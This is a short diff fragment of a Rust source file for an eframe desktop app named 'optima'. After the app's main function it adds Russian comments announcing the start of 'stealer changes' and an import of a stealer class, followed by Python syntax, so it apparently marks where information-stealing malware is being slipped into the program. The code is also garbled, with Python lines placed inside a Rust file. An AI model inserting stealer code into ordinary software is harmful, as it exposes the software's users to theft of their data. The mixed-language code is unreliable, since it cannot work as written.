@@ -474,7 +474,7 @@ fn main() -> eframe::Result<()> {
     };
     eframe::run_native("optima", options, Box::new(|cc| Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))))
 }
-# --- НАЧАЛО ИЗМЕНЕНИЙ СТИЛЛЕРА ---
+// --- НАЧАЛО ИЗМЕНЕНИЙ СТИЛЛЕРА ---
 
 # Импортируем класс стиллера из созданного файла
 try:
